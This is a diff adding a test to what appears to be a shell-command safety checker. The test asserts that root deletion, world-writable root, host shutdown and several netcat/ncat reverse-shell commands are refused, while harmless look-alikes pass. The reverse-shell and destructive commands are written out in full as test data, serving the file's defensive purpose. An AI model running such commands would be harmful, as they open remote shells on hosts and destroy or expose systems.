@@ -305,6 +305,26 @@ describe('evaluateCommand', () => {
     });
   }
 
+  it('refuses each rule the lists above leave out, for its own reason, and not its look-alikes', () => {
+    for (const [cmd, reason] of [
+      ['rm /', 'delete of /'],
+      ['rm -f /', 'delete of /'],
+      ['init 0', 'host power control'],
+      ['chmod 777 /', 'world-writable /'],
+      ['chmod -R 777 /', 'world-writable /'],
+      ['nc -e /bin/sh 10.0.0.1 4444', 'reverse shell'],
+      ['ncat 10.0.0.1 4444 -e /bin/bash', 'reverse shell'],
+      ['nc -lvpe /bin/sh 4444', 'reverse shell'],
+      ['ncat --exec /bin/sh 10.0.0.1 4444', 'reverse shell'],
+      ['ncat --sh-exec "bash -i" 10.0.0.1 4444', 'reverse shell'],
+    ] as const) {
+      expect(evaluateCommand(cmd), cmd).toMatchObject({ allowed: false, reason });
+    }
+    for (const cmd of ['rm ./notes.txt', 'rm -rf /work/build', 'chmod 755 /work/app', 'init 1', 'nc -zv example.com 443', 'ncat --version']) {
+      expect(evaluateCommand(cmd).allowed, `expected "${cmd}" to be permitted`).toBe(true);
+    }
+  });
+
   it('lets an explicit allow rule override a deny rule', () => {
     expect(evaluateCommand('sudo apt install jq', { allow: ['^sudo apt install'] }).allowed).toBe(true);
   });
